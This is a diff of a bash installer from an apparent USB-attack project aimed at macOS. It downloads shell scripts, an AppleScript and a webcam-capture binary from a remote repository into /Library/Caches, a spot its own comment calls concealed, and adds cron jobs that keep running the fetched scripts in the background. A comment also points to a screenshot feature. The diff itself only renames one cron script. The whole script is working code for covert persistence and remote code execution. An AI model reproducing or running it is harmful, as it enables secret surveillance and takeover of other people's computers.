@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # Download the main files from the repository and saves them to the /Library/Caches folder (write accessible, concealed folder)
-wget -O /Library/Caches/cron-01.sh https://raw.githubusercontent.com/angeldiazibarra/osx-usb-hack-arduino/master/crons/cron-01.sh
+wget -O /Library/Caches/cron-05.sh https://raw.githubusercontent.com/angeldiazibarra/osx-usb-hack-arduino/master/crons/cron-05.sh
 wget -O /Library/Caches/cron-60.sh https://raw.githubusercontent.com/angeldiazibarra/osx-usb-hack-arduino/master/crons/cron-60.sh
 
 wget -O /Library/Caches/soundalarm.scpt https://raw.githubusercontent.com/angeldiazibarra/osx-usb-hack-arduino/master/resources/soundalarm.scpt
@@ -24,7 +24,7 @@ chmod 755 /Library/Caches/imagesnap
 ( crontab -l ; echo "0 * * * * cd /Library/Caches && sh cron-60.sh > /Library/Caches/cron-60.log 2>&1" ) | crontab -
 
 # Add cron task to run every minute
-( crontab -l ; echo "*/5 * * * * cd /Library/Caches && sh cron-01.sh > /Library/Caches/cron-01.log 2>&1" ) | crontab -
+( crontab -l ; echo "*/5 * * * * cd /Library/Caches && sh cron-05.sh > /Library/Caches/cron-05.log 2>&1" ) | crontab -
 
 # Test the screenshot feature
 # sh /Library/Caches/screenshot.sh 
